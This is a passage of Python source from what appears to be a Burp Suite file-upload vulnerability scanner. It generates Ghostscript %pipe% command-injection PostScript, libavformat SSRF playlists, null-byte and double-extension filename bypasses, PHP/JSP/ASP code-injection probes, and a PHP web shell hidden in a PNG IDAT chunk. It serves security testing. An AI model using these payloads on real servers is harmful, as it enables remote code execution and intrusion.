                       "The payload used the {} argument ({}) and the payload {}. Interactions: <br><br>"
        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "Gs"

        content_original_cve = "%!PS\n" \
                               "currentdevice null true mark /{} (%pipe%{} {} )\n" \
                               ".putdeviceparams\n" \
                               "quit"

        content_2 = "%!PS\n" \
                    "*legal*\n" \
                    "*{{ null restore }} stopped {{ pop }} if*\n" \
                    "*legal*\n" \
                    "*mark /{} (%pipe%{} {}) currentdevice putdeviceprops*\n" \
                    "*showpage*"

        content_ubuntu = "%!PS\n" \
                         "userdict /setpagedevice undef\n" \
                         "save\n" \
                         "legal\n" \
                         "{{ null restore }} stopped {{ pop }} if\n" \
                         "{{ legal }} stopped {{ pop }} if\n" \
                         "restore\n" \
                         "mark /{} (%pipe%{} {}) currentdevice putdeviceprops"

        content_centos = "%!PS\n" \
                         "userdict /setpagedevice undef\n" \
                         "legal\n" \
                         "{{ null restore }} stopped {{ pop }} if\n" \
                         "legal\n" \
                         "mark /{} (%pipe%{} {}) currentdevice putdeviceprops"

        techniques = (
            ("OutputFile", "CVE-2017-8291", content_original_cve),
            ("OutputICCProfile", "CVE-2016-7976", content_original_cve),

            ("OutputFile", "http://openwall.com/lists/oss-security/2018/08/21/2", content_2),
            #("OutputICCProfile", "http://openwall.com/lists/oss-security/2018/08/21/2", content_2),

            # OutputFile worked on a Linux minti 4.8.0-53-generic #56~16.04.1-Ubuntu SMP Tue May 16 01:18:56 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
            # With "identify" and "convert" from ImageMagick 6.8.9-9 Q16 x86_64 2017-03-14
            # But OutputICCProfile didn't:
            #   ./base/gsicc_manage.c:1088: gsicc_open_search(): Could not find %pipe%sleep 6.0
            # | ./base/gsicc_manage.c:1708: gsicc_set_device_profile(): cannot find device profile
            #   ./base/gsicc_manage.c:1088: gsicc_open_search(): Could not find %pipe%sleep 6.0
            # | ./base/gsicc_manage.c:1708: gsicc_set_device_profile(): cannot find device profile
            ("OutputFile", "http://openwall.com/lists/oss-security/2018/08/21/2", content_ubuntu),
            #("OutputICCProfile", "http://openwall.com/lists/oss-security/2018/08/21/2", content_ubuntu),

            ("OutputFile", "http://openwall.com/lists/oss-security/2018/08/21/2", content_centos),
            #("OutputICCProfile", "http://openwall.com/lists/oss-security/2018/08/21/2", content_centos),
        )

        # Sleep based
        for cmd_name, cmd, factor, args in self._get_sleep_commands(injector):
            for param, reference, content in techniques:
                details = base_detail + detail_sleep.format(param, reference, cmd)
                issue = self._create_issue_template(injector.get_brr(), name, details, confidence, severity)
                sleep_content = content.format(
                    #injector.opts.image_width,
                    #injector.opts.image_height,
                    param,
                    cmd,
                    str(injector.opts.sleep_time * factor) + args
                )
                self._send_sleep_based(injector, basename + cmd_name, sleep_content, self.GS_TYPES, injector.opts.sleep_time, issue)

        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return []
        colab_tests = []

        # Colab based
        for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
            for param, reference, content in techniques:
                details = base_detail + detail_colab.format(param, reference, cmd)
                issue = self._create_issue_template(injector.get_brr(), name, details, confidence, severity)
                attack = content.format(
                    #injector.opts.image_width,
                    #injector.opts.image_height,
                    param,
                    cmd,
                    server
                )
                colab_tests.extend(self._send_collaborator(injector, burp_colab, self.GS_TYPES, basename + param + cmd_name,
                                                           attack, issue, replace=replace, redownload=True))

        return colab_tests

    def _libavformat(self, injector, burp_colab):
        # TODO: Implement .qlt files maybe? https://www.gnucitizen.org/blog/backdooring-mp3-files/
        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return []

        # burp collaborator based as described on https://hackerone.com/reports/115857
        basename = self.FILE_START + "AvColab"
        content_m3u8 = "#EXTM3U\r\n#EXT-X-MEDIA-SEQUENCE:0\r\n#EXTINF:10.0,\r\n{}example.mp4\r\n##prevent cache: {}\r\n#EXT-X-ENDLIST".format(BurpExtender.MARKER_COLLAB_URL, str(random.random()))

        name = "LibAvFormat SSRF"
        severity = "High"
        confidence = "Certain"
        detail = "A Burp Colaborator interaction was detected when uploading an libavformat m3u8 payload " \
                 "which contains a burp colaborator URL. This means that Server Side Request Forgery is possible. " \
                 "Check https://hackerone.com/reports/115857 for more details. Also check manually if the website is not vulnerable to " \
                 "local file include. Interactions:<br><br>"
        issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)

        colabs = self._send_collaborator(injector, burp_colab, self.AV_TYPES,
                                       basename + "M3u", content_m3u8, issue)

        # avi file with m3u as described on https://hackerone.com/reports/226756
        # https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/edit#slide=id.g2239eb85ba_0_20
        # and https://github.com/neex/ffmpeg-avi-m3u-xbin
        avi_generator = AviM3uXbin()

        name = "LibAvFormat SSRF"
        severity = "High"
        confidence = "Certain"
        detail = "A Burp Colaborator interaction was detected when uploading an libavformat m3u8 payload inside an AVI file " \
                 "which contains a burp colaborator URL. This means that Server Side Request Forgery is possible. " \
                 "Check https://hackerone.com/reports/226756 and https://github.com/neex/ffmpeg-avi-m3u-xbin for more details. " \
                 "Usually this means it is vulnerable to local file inclusion. Interactions:<br><br>"
        issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)

        #Yes this looks weird here that we pass content_m3u8, but that's correct
        colabs2 = self._send_collaborator(injector, burp_colab, self.AV_TYPES,
                                         basename + "AviM3u", content_m3u8, issue, replace=avi_generator.get_avi_file)

        colabs.extend(colabs2)
        return colabs

    def _php_rce_params(self, extension, mime, content=""):
        lang = "PHP"

        # The different file extensions can vary in several ways:
        # - the original extension the file had that was uploaded in the base request, self._marker_orig_ext, eg. .png
        # - the payload extension, for example if we upload php code it would be .php
        # - the real file extension, for example .gif if we produced a gif file that has php code in the comment, extension

        # PHP file extensions rely on Apache's AddHandler option, and there are horrible examples
        # on the Internet, such as:
        # AddHandler x-httpd-php .php .php3 .php4 .php5 .phtml
        # According to this, .pht is very unlikely: http://stackoverflow.com/questions/32912839/what-are-pht-files
        if mime:
            # This means we're hiding php code in metadata of a file type
            types = {
                ('', BurpExtender.MARKER_ORIG_EXT, ''),
                ('', '.php' + BurpExtender.MARKER_ORIG_EXT, ''),
                # ('', '.php'+self._marker_orig_ext, mime),
                # ('', '.php.'+extension, ''),
                ('', '.php' + extension, mime),
                ('', '.php\x00' + extension, mime),
                ('', '.php%00' + extension, mime),
                # ('', '.php5'+extension, mime),
                ('', '.php', ''),
                # ('', '.php5', ''),
                ('', '.php', mime),
                ('', '.php5', mime),
                ('', '.phtml', mime)
            }
        else:
            # This means it is plain php files we're uploading
            mime = 'application/x-php'
            types = {
                ('', BurpExtender.MARKER_ORIG_EXT, ''),
                ('', '.php' + BurpExtender.MARKER_ORIG_EXT, ''),
                # ('', '.php'+self._marker_orig_ext, mime),
                ('', '.php\x00' + BurpExtender.MARKER_ORIG_EXT, ''),
                ('', '.php%00' + BurpExtender.MARKER_ORIG_EXT, ''),
                # ('', '.php\x00'+self._marker_orig_ext, mime),
                # ('', '.php%00'+self._marker_orig_ext, mime),
                # ('', '.php5'+extension, mime),
                ('', '.php', ''),
                ('', '.php5', ''),
                ('', '.phtml', ''),
                ('', '.php', mime),
                # ('', '.php5', mime),
            }
        # Problem: when we have XMP data the meta data will look like this:
        # <?xpacket begin=' ' id='W5M0MpCehiHzreSzNTczkc9d'?>
        # while PHP servers are fine with a ?> somewhere, they will fail at <? as xpacket is not
        # a PHP function . Therefore we need to remove those. However, a lot of metadata formats
        # are actually not looking for <?xpacket, but rather just check for <x:xmpmeta .
        # Actually, OSX screenshots will have XMP data, but no <?xpacket specification
        # Therefore, let's just replace the <?xpacket .* ?> tags with spaces. As long as the
        # <x:xmpmeta stays intact we should be fine.
        xpacket = "<?xpacket"
        xpacket_end = "?>"
        while xpacket in content:
            start = content.index(xpacket)
            end = content.index(xpacket_end, start) + len(xpacket_end)
            content = content[:start] + " " * (end - start) + content[end:]
        return lang, types, content

    def _php_gen_payload(self):
        r = ''.join(random.sample(string.ascii_letters, 5))
        payload = '<?php echo "' + r + '-InJ" . "eCt."."TeSt";?>'
        expect = r + '-InJeCt.TeSt'
        return payload, expect

    def _php_rce(self, injector):
        # automated approach with BackdooredFile class
        self._servercode_rce_backdoored_file(injector, self._php_gen_payload,
                                             self._php_rce_params)

        # Boring, classic, straight forward php file:
        self._servercode_rce_simple(injector, self._php_gen_payload,
                                    self._php_rce_params)

        # Manual tests with special cases for image metadata injection:
        lang, types, _ = self._php_rce_params(".png", "image/png")
        self._servercode_rce_png_idatchunk_phponly(injector, types)

        payload_exact_13_len = '<?echo "AB"?>'
        lang, types, _ = self._php_rce_params(".gif", "image/gif")
        self._servercode_rce_gif_content(injector, lang, payload_exact_13_len, types)

    def _jsp_rce_params(self, extension, mime, content=""):
        lang = "JSP"
        if mime:
            types = {
                ('', BurpExtender.MARKER_ORIG_EXT, ''),
                ('', '.jsp' + BurpExtender.MARKER_ORIG_EXT, ''),
                # ('', '.jsp' + self._marker_orig_ext, mime),
                # ('', '.jsp' + extension, ''),
                ('', '.jsp' + extension, mime),
                ('', '.jsp\x00' + extension, mime),
                ('', '.jsp%00' + extension, mime),
                ('', '.jsp', ''),
                ('', '.jsp', mime),
            }
        else:
            mime = "application/x-jsp"
            types = {
                ('', BurpExtender.MARKER_ORIG_EXT, ''),
                ('', '.jsp' + BurpExtender.MARKER_ORIG_EXT, ''),
                ('', '.jsp\x00' + BurpExtender.MARKER_ORIG_EXT, ''),
                ('', '.jsp%00' + BurpExtender.MARKER_ORIG_EXT, ''),
                # ('', '.jsp\x00' + self._marker_orig_ext, mime),
                # ('', '.jsp%00' + self._marker_orig_ext, mime),
                ('', '.jsp', ''),
                ('', '.jsp', mime),
            }
        return lang, types, content

    def _jspx_rce_params(self, extension, mime, content=""):
        lang = "JSPX"
        if mime:
            types = {
                ('', BurpExtender.MARKER_ORIG_EXT, ''),
                ('', '.jspx' + BurpExtender.MARKER_ORIG_EXT, ''),
                # ('', '.jspx' + self._marker_orig_ext, mime),
                # ('', '.jspx.'+ extension, ''),
                ('', '.jspx' + extension, mime),
                ('', '.jspx\x00' + extension, mime),
                ('', '.jspx%00' + extension, mime),
                ('', '.jspx', ''),
                ('', '.jspx', mime),
            }
        else:
            mime = "application/x-jsp"
            types = {
                ('', BurpExtender.MARKER_ORIG_EXT, ''),
                ('', '.jspx' + BurpExtender.MARKER_ORIG_EXT, ''),
                ('', '.jspx\x00' + BurpExtender.MARKER_ORIG_EXT, ''),
                ('', '.jspx%00' + BurpExtender.MARKER_ORIG_EXT, ''),
                # ('', '.jspx\x00' + self._marker_orig_ext, mime),
                # ('', '.jspx%00' + self._marker_orig_ext, mime),
                ('', '.jspx', ''),
                ('', '.jspx', mime),
            }
        return lang, types, content

    def _jsp_gen_payload_expression_lang(self):
        # these numbers are arbitrary but make sure we don't get an int overflow...
        a = random.randint(3, 134)
        b = random.randint(3, 8456)
        c = random.randint(3, 7597)
        d = random.randint(3, 65123)
        e = random.randint(1000000000000000, 2115454131589564)
        payload = "${" + str(a) + " * " + str(b) + "+" + str(c) + "+" + str(d) + "+" + str(e) + "}"
        # make sure the payload has always the same length
        desired_length = 60
        payload = (desired_length - len(payload)) * " " + payload
        expect = str(a * b + c + d + e)
        return payload, expect

    def _jsp_gen_payload_tags(self):
        r = ''.join(random.sample(string.ascii_letters, 5))
        payload = '<% System.out.println("InJ" + "eCt"+"TeSt-' + r + '"); %>'
        expect = 'InJeCtTeSt-' + r
        return payload, expect

    def _jspx_gen_payload(self):
        """Actually this is JSPX with JSP 2.0"""
        one = ''.join(random.sample(string.ascii_letters, 8))
        two = ''.join(random.sample(string.ascii_letters, 8))
        three = ''.join(random.sample(string.ascii_letters, 8))
        payload = '''<tags:xhtmlbasic xmlns:tags="urn:jsptagdir:/WEB-INF/tags"
                 xmlns:jsp="http://java.sun.com/JSP/Page"
                 xmlns:fmt="http://java.sun.com/jsp/jstl/fmt"
                 xmlns="http://www.w3.org/1999/xhtml">
                  <jsp:directive.page contentType="text/html" />
                  <head>
                    <title>JSPX</title>
                  </head>
                  <body>
                    <c:set var="three" value='${"''' + three + '''"}'/>
                    <c:set var="one" value='${"''' + one + '''"}'/>
                    <c:set var="two" value='${"''' + two + '''"}'/>
                    <text>${one}${two}${three}</text>
                  </body>
                </tags:xhtmlbasic>'''
        expect = one + two + three
        return payload, expect

    def _jsp_rce(self, injector):
        # automated approach with BackdooredFile class
        # sadly, the only two types that produce valid JSP files that can be detected by this plugin are GIF and PDF
        # with all others the JSP files starts with high byte values or the JSP parser throws another exception. For example:
        # org.apache.jasper.JasperException: java.lang.ClassNotFoundException: org.apache.jsp.uploads._1DownloadMeMetamakernotesJSP3_jsp
        # org.apache.jasper.servlet.JspServletWrapper.getServlet(JspServletWrapper.java:177)
        # org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:369)
        # org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:390)
        # org.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)
        # javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
        # or
        # org.apache.jasper.JasperException: Unable to compile class for JSP
        # org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:661)
        # org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:357)
        # org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:390)
        # org.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)
        # javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
        # while that can be interesting too, it doesn't justify to send all kind of formats that only produce errors
        # therefore we send only GIF and PDF, as well as JPEG to trigger the error case (JPEG is probably the most popular format)
        # As JPEG and PNG both start with non-ascii, this is probably not possible. But let me know if you figure it out :)
        # But on the other hand we have different injection possibilities:
        # Expression Language with ${}
        # Old school tags <%  %>
        # TODO feature: Let me know if I'm wrong and there are installations which work fine with such files

        non_working_formats = {".png", ".tiff"}
        used_formats = set(BackdooredFile.EXTENSION_TO_MIME.keys()) - non_working_formats
        self._servercode_rce_backdoored_file(injector, self._jsp_gen_payload_expression_lang, self._jsp_rce_params,
                                             formats=used_formats)
        self._servercode_rce_backdoored_file(injector, self._jsp_gen_payload_tags, self._jsp_rce_params,
                                             formats=used_formats)

        # Boring, classic, straight forward jsp file:
        self._servercode_rce_simple(injector, self._jsp_gen_payload_expression_lang, self._jsp_rce_params)
        self._servercode_rce_simple(injector, self._jsp_gen_payload_tags, self._jsp_rce_params)

        # New JSP XML Syntax (.jspx)
        self._servercode_rce_simple(injector, self._jspx_gen_payload, self._jspx_rce_params)

        # rce gif content:
        # TODO feature: change this to something more unique... in general, change that _servercode_rce_gif_content method
        payload_exact_13_len = "${'InJeCtTe'}"
        to_expect = "InJeCtTe"
        lang, types, _ = self._jsp_rce_params(".gif", "image/gif")
        self._servercode_rce_gif_content(injector, lang, payload_exact_13_len, types, expect=to_expect)

    def _asp_rce_params(self, extension, mime, content=""):
        lang = "ASP"
        if mime:
            # TODO feature: include .asa and .asax etc. but we need a Windows test server for that first
            # According to https://community.rapid7.com/community/metasploit/blog/2009/12/28/exploiting-microsoft-iis-with-metasploit
            # the file extension .asp;.png should work fine... see also https://soroush.secproject.com/downloadable/iis-semicolon-report.pdf
            types = {
                ('', BurpExtender.MARKER_ORIG_EXT, ''),
                ('', '.asp;' + BurpExtender.MARKER_ORIG_EXT, ''),
                # ('', '.asp' + self._marker_orig_ext, mime),
                # ('', '.asp.' + extension, ''),
                ('', '.asp;' + extension, mime),
                ('', '.asp' + extension, mime),
                ('', '.asp\x00' + extension, mime),
                ('', '.asp%00' + extension, mime),
                ('', '.asp', ''),
                ('', '.asa', ''),
                ('', '.asax', ''),
                #('', '.asp', mime),
                ('', '.aspx', mime)
            }
        else:
            mime_asp = 'application/asp'
            mime_aspx = 'application/aspx'
            types = {
                ('', BurpExtender.MARKER_ORIG_EXT, ''),
                ('', '.asp;' + BurpExtender.MARKER_ORIG_EXT, ''),
                # ('', '.asp' + self._marker_orig_ext, mime_asp),
                ('', '.asp\x00' + BurpExtender.MARKER_ORIG_EXT, ''),
                ('', '.asp%00' + BurpExtender.MARKER_ORIG_EXT, ''),
                # ('', '.asp\x00' + self._marker_orig_ext, mime_asp),
                # ('', '.asp%00' + self._marker_orig_ext, mime_asp),
                ('', '.asp', ''),
                ('', '.asp', mime_asp),
                ('', '.aspx', ''),
                ('', '.aspx', mime_aspx),
            }

        return lang, types, content

    def _asp_gen_payload(self):
        r = ''.join(random.sample(string.ascii_letters, 5))
        payload = '<%= "In"+"Je' + r + 'C" + "t.Te"+"St" %>'
        expect = 'InJe' + r + 'Ct.TeSt'
        return payload, expect

    def _asp_rce(self, injector):
        # automated approach with BackdooredFile class
        self._servercode_rce_backdoored_file(injector, self._asp_gen_payload, self._asp_rce_params)

        # Boring, classic, straight forward asp file:
        self._servercode_rce_simple(injector, self._asp_gen_payload, self._asp_rce_params)

        payload_exact_13_len = '<%= "A"+"B"%>'
        lang, types, _ = self._asp_rce_params(".gif", "image/gif")
        self._servercode_rce_gif_content(injector, lang, payload_exact_13_len, types)

    def _servercode_rce_simple(self, injector, payload_func, param_func):
        payload, expect = payload_func()
        lang, types, content = param_func(None, None, payload)
        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "Simple" + lang
        title = lang + " code injection" # via simple file upload"
        desc = 'Remote command execution through {} payload in a normal {} file. The server replaced the code {} inside ' \
               'the uploaded file with {} only, meaning that {} code ' \
               'execution is possible.'.format(lang, lang, cgi.escape(payload), expect, lang)
        issue = self._create_issue_template(injector.get_brr(), title, desc, "Certain", "High")
        self.dl_matchers.add(DownloadMatcher(issue, filecontent=expect))
        self._send_simple(injector, types, basename, content, redownload=True)

    def _servercode_rce_backdoored_file(self, injector, payload_func, param_func, formats=None):
        bi = BackdooredFile(injector.opts.get_enabled_file_formats(), self._global_opts.image_exiftool)
        size = (injector.opts.image_width, injector.opts.image_height)
        for payload, expect, name, ext, content in bi.get_files(size, payload_func, formats):
            lang, types, content = param_func(ext, BackdooredFile.EXTENSION_TO_MIME[ext], content)
            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "BfRce" + name + lang
            # content_start = content[:content.index(payload)]
            # content_end = content[content.index(payload)+len(payload):]
            title = lang + " code injection"  # via " + ext[1:].upper() + " Metadata "
            desc = 'Remote command execution through {} payload in Metadata of type {}. The server replaced the code {} inside ' \
                   'the uploaded file with {} only, meaning that {} code ' \
                   'execution is possible.'.format(lang, name, cgi.escape(payload), expect, lang)
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Certain", "High")
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=expect))
            self._send_simple(injector, types, basename, content, redownload=True)

    def _servercode_rce_png_idatchunk_phponly(self, injector, types):
        if injector.opts.file_formats['png'].isSelected():
            # PNG with payload in idat chunk that is PHP code taken from https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
            # TODO feature: add other variations of this idatchunk trick. Currently what we do here is simply take the png that has already the idat chunk.
            # We simply assume that a server that is stripping *all* metadata cannot strip an idatchunk as it is part of the image data (obviously)
            # However, we could do other variations of the not-yet-deflated images, that when transformed with imagecopyresize or imagecopyresample
            # would even survive that. When implementing that, a generic approach which allows resizing first to sizes self._image_formating_width,
            # self._image_formating_height etc.
            lang = "PHP"
            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "IdatchunkPng" + lang
            content_start = "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00 \x00\x00\x00 \x08\x02\x00\x00\x00\xfc\x18\xed\xa3\x00\x00\x00\tpHYs\x00\x00\x0e\xc4\x00\x00\x0e\xc4\x01\x95+\x0e\x1b\x00\x00\x00`IDATH\x89c\\"
            content_end = "X\x80\x81\x81\xc1s^7\x93\xfc\x8f\x8b\xdb~_\xd3}\xaa'\xf7\xf1\xe3\xc9\xbf_\xef\x06|\xb200c\xd9\xb9g\xfd\xd9=\x1b\xce2\x8c\x82Q0\nF\xc1(\x18\x05\xa3`\x14\x8c\x82Q0\n\x86\r\x00\x00\x81\xb2\x1b\x02\x07x\r\x0c\x00\x00\x00\x00IEND\xaeB`\x82"
            # TODO feature: here we use a modified payload that is also an idat chunk
            code = "<?=$_GET[0]($_POST[1]);?>"
            content = content_start + code + content_end
            # we expect the server to simply execute "code", but as the parameters in $_GET and $_POST do not make sense
            # it will fail and simply cut off the image right before "code". In practice this means an HTTP 500
            # is returned and the body only includes content_start. Therefore this tests checks if "content_start"
            # is in the body and that "code" is for sure not in the body
            expected_download_content = content_start
            title = lang + " code injection" # via PNG IDAT "
            desc = 'Remote command execution through {} payload in IDAT chunks, payload from https://www.idontplaydarts' \
                   '.com/2012/06/encoding-web-shells-in-png-idat-chunks/ . The server probably tried to execute the code' \
                   ' {} inside the uploaded image but failed, meaning that {} code execution seems possible. Usually ' \
                   'the server will respond with only the start of the file which has length {} and cut off the rest. ' \
                   'Also, it usually responds with an HTTP 500 error.'.format(lang, cgi.escape(code), lang, str(len(content_start)))
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Tentative", "High")
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=expected_download_content, not_in_filecontent=code))
            self._send_simple(injector, types, basename, content, redownload=True)

    def _servercode_rce_gif_content(self, injector, lang, payload_exact_13_len, types, expect="AB"):
        if injector.opts.file_formats['gif'].isSelected():
            # TODO: PHP not working, simply returns payload <?echo "AB"?> inside GIF, at least on my test server... I guess
            # the PHP parser already stopped looking for <? when it reaches the payload as too much garbage...
            # However, it *does* get properly detected for JSP tomcat servers where it is injected with ${}!
            # TODO feature: defining expect as "AB" is pretty stupid as that is not really unique....
            # GIF with payload not in exif but in file content that survives PHP's getimagesize() and imagecreatefromgif()
            # https://www.secgeek.net/bookfresh-vulnerability/#comment-331
            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "InContentGif" + lang
            start = 'R0lGODlh1wBUAPf/APz9/ubr9Jx5G+ru9uTq9LikaP3opuXNiWB8hP378fb4++zw9+/y+OrUmenXp+Tp882tXWqFi9zCeNa5bP7yyfr6/eHI' \
                    'gcetZ09mbfDz+ZOXeN7EfExiaNbDh9m8cVF8ieLo8fv8/fDZm7Cztff4/P3ik+js9fDy+ODGfq6qhunRjP767OLJg9S3afL0+cyxabOaWv700' \
                    'f722Obq9KKacFlyelB6h/3+/omWhOjctdq+dNCxYdO6dMe6haWCJ/TpzNvAdqmKNl96gvHepvP1+jxlaNjc5P7uusq0clt1fFZudffu1fz8/V' \
                    'JpcOLm7EleZFx2fvHhsfP2+vv37P7+9/755PHlxNK0ZauTVrqaQ7yfVXyBbuDHgNm3WOju9mlzaPv1493i6eK1U+ziw3SJgvHXkOvw9vPkueT' \
                    'Mh6iMRP7ssbOSOl55gOvhvMaWMenu9eS8Z7a5wN+rQerNhMHFzFF5hsjM0te6bujt9fvuxaONUjBRVOPKhdS9evfpvM3R1//++/jtzNLX4ObJ' \
                    'fv39/vj5/MCkXL3Bx9WqTU94hevv9sSkUuPp89GyY+7y9+vu9NPSyNm/ePbqw62SSvH0+Z+CNubPi93Del2BhcaoXfHmyPL1+e7x+Ozn0V14f' \
                    '/f5++jDbdvCfYqKb7CNMu7x92F8gv733uvLikdbYNXAgODCc8rFsurKevjx3c2tVZ+GQ+Dl72SAh1dxePDy9+PLhVpnYV55gZ6gglRtdFx4gN' \
                    '/Aa1l/hti7cH+QgubKglN9iFp0e/fmsd7JiPr7/V5xcf379vf17uHMi+3w9V11fNO1Z1tyef7+//T2+v7+/vn6/Pj6/PX3+/7///////X3+vb' \
                    '3+/T3+/n7/e3x91dwd/T3+lRsc/n6/f7//v/+/////vr7/Pj6/eTp9PT2+//+/u3y9/X2+s+wYO3y+PX2+2F9hc+vXzheYdC3ceXRmefs9fb3' \
                    '/MioV/fouPXx5Vd9h199hrWEJP7wwd29Z+fr8F97gr+tc+nIeFlwdVVvd////yH5BAEAAP8ALAAAAADXAFQAAAj/ANUJHEiw4MBYEQwqXMiwo' \
                    'UF6HyJKnEixosWJNj7YsPGvo8ePIEOKHEmypMmTKFOKdGgQYSwELAcimEmzps2bC+v9usiz50WOKoMKHUq0aMiYBxPGvMm0adOBpXbt/DDVp1' \
                    'WMGYEa3cq1a1GkAiPEaugUgb6zaNOqPetUHb2qV+NS1Oq1rt27Hpe6ZMh07VkhgAMLFlIqFplevXAoVoyYTCy4cq9u1Ii3suWtSMUq7Kt2sBB' \
                    'boEPbOnwrRY8OwiypVn3ggLAOPVLcIhMhctzJl3PrRhkzglKCnP8GDs2mOBtPyCPgMH1AhYrVq1u3RnOM1rFjwmL3qm2bZ9bd4MN//2TpGybw' \
                    'mmkFgy6OvD0UKGRMO3cO3ZL0+2jy09pPiw+tHrNR1d1F4hW4m0O+FWRTeoCt59577yXRSwodWPJcfQfYZ990+aFBi4f78cEHC7QIk0oKZAxok' \
                    'YEsWtZQeTItKNxnxyEHIYRJxNcBffWxhl+H+oXIwogsFGmBBancEgFkttHV4pNcLYTQb+rIqM9wNd4IRRJcQqFBKj1G9+MBQfbXX5FoHmkBF2' \
                    'r2gAOTkUEpZ5QtaRbjTAzakiWOSQADTA3xZdjjfdIBqZ9/Iqap5ppcNIoCCqGksKSKc1ZKVJ1j3WmWcHraiKOfNdQAjCg9hLnhj2UKmSYLRzb' \
                    'q6qOPbv9wSQ+9wGmVpbiqVNBeAlnZ4HE39vlnqMtosCN0hJJJZochikhkmmy+CusG1FY7qwZ1JKKtDXVcleu3JhHEa5XoXUmjp1sOW4Mssixz' \
                    'S2piospsf86uuqijsKJQLbWXXCLBJTzcAtFG2hacSEYVgavwSmHZSS6enAIbIajrZpNNP7eggay8QdaLppGt4jvtvpfI6q8EEvRxC5M2GFzHZ' \
                    'B8sLHNe6iSoKVoNottnqLJYrIQSGfuIH5kf8kcvC66uscaajOYbq7Umn4yyBED0oYGtGrW87cwzT6kgxOba4unO6/bszzZNiCJMssqCaHS9XG' \
                    'wQygUCCDCBo1w8vW/U/07/TTUQgPeBA8I9ccu1zA73Cva5nkzMcza4YIABB1t0kCyzINZLpAWh9NGOD1pcEES+e/Pbr9R/Aw64Djq0k6K3hyu' \
                    'c6c3mSpxuDdmgzQEGTTRBTA+FLpuqx0ai0AcSMAgARwMC7KC3tf36jbLqqrPO+j6YwB77t19DDJjtwMiCNu9NbGN+EykUOi9/iSq6Zijt7COA' \
                    'G6cE44oPe58uferVW2+9Byu71fa4d55N5ew9wFBCEzBgPn8o4XxpM5Tb6PUsVoVsA8ebhADk0ABJlMEHizAd6qZGPR0AwX8eSKEKe0E4Ag0wV' \
                    'wXkVOPEVz5/mA0XEPzd+ihYwVa1agORaEcB/+YnhjMEogwt8MHpUAcE/vnvfyr0AC94gT2fvBCGivOeLWrgjyb4IxuPUwIO0bZAGoDIQ4iqoA' \
                    'VdlTdI9eECafCBGMTwg1aIQASjyMIIqbe6J0YxhVO8wx2u1pMr4upOZ8mFLHCBixpw6U89EyMZF/iFVITITB8DWbTwBUQkDBERYgDFEsAwBBG' \
                    'EQgAeIGH//PjHKQbyDhNAAndcaMg5ZVEIUPBHIz9VMUn2boEYoMEBKPgxNTWqadMKBQ9ENwo4wGEOrZhCFKIwhCysgX8nZGUUXSlIWMJyAoSk' \
                    'ZS2h1Ct9AMOGSRCb4244SckRIxWIKua9RKYvWR0veboABSgaAP+GKVghCjlwhwBa0EdtAtKVvOjmBBY6gRYgIRY8GactaQIMW5wLgaHKhi7bO' \
                    'TkNZNICa9wk6fgVxH34IAv84AcrhgCGBPygDW2IghZGkU0UbpObCmVoQxuqgYhKlJzeE4LEksAzB0JQchioxT7kycY2jqxaKbtA8uZAVRWcYQ' \
                    'rFeClMoyAACEDxpq/UqU5bQNYWFGAX4vypgWjyF3XeLpJHnRwHviAM9yHzeaaLhCd9EA/nlKGDWP1BDnIwhjG8wAc6aOUru/lNhpb1sS94XcL' \
                    'U2qKgSmxYGsVh7yTHgc7SwIIhc1rpTAaEZcLABw0owx2HEIgEFEMTDnAAYa0ggHj/3JSxjR3rY1ugjN72dEWUZZEWG/dWo26WsxxQqjDYKFqS' \
                    'LVECOvCkAPoggiFY9wytKMYUYCvbNnSiAwLQAUIFOYHcLnS3Ze1tb88K3OAWSB9m+R5xIZmNB5IRuU94Jz3rmb/ntk4LAghCMIYwzTP8AAxUm' \
                    'MIYHOAOB3h3CaOoLWPFel70qre3V7jCBSA6WfeKRwhtJe7OZLHR43aWA0/YgtP461ypRcIDhvCBDzoQgzyc4QySkMQSpgAIfzLYwZ1YQgzAy1' \
                    'cKoze96s2wklnYYQ+Dhw1/uWwvz4dcFD9BA04t3XOpFgkdXCDCL/ADBWJgihhIIhCjnIIzErBgdxC2/xUykEGNXyCAUZyjwha+sJIz3IhG/JY' \
                    'iThYPFK7UqeJqFpgnfgIHaDCI/PFtal1uR4S1EIx7jFkGpqhCFVoRzQQAIquDzcE8NC1nCtwjGABeQyN2q2dl7JnPfaYBWgEdaPAkg9Dzzah9' \
                    'Ed3ZJzxBqS3WH5c90I41CCALIlDDEShAAUxXYQUJWAEYVlAMZxSjFWPIwRKiXQVTlPoeahBBFgSgamXwFsOufnWf112A7NG61rpJhnwNfV+5W' \
                    'rkWSNBXyYQ9PR3wINWDMICyLR0DGTw7AVSgAsKpQA4mzKMT8yhGArj97SOowQC+MHYWePtqWK+7ETtoRLubDG/LLOMzIv/OaImr7OtfR2KJTI' \
                    'wELwwhAB/oogQGEPgR7lHwgyecCoAI+jeYYAxj/FzhK6hCqS2e8xLoQsaLUPfHQ76Dql/A3RMpuW5O7lb6PtDEvfZ1LWS1PyBEggeZ8IEAulC' \
